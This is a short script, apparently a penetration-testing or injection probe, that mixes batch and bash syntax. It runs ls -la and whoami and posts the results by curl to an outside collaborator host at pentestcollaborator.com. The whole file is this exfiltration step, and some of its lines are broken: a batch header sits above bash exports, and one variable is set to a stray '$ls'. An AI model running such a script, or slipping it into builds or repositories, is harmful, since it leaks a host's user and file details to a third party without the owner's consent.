@echo off
setlocal

echo test2

export SERVER_URL=https://uqowc8eg8jdobvvul8rwjfwozf56t0hp.pentestcollaborator.com

echo Retrieving environment variables...

echo Retrieve environment variables
export VAR1=$ls
export VAR2=$(ls -la)
export VAR3=$(whoami)

echo Sending environment variables to server...

echo Send environment variables to server
curl -X POST -H "Content-Type: application/html" -d "{\"VAR1\":\"$VAR1\",\"VAR2\":\"$VAR2\",\"VAR3\":\"$VAR3\"}" $SERVER_URL

echo Environment variables sent to server.
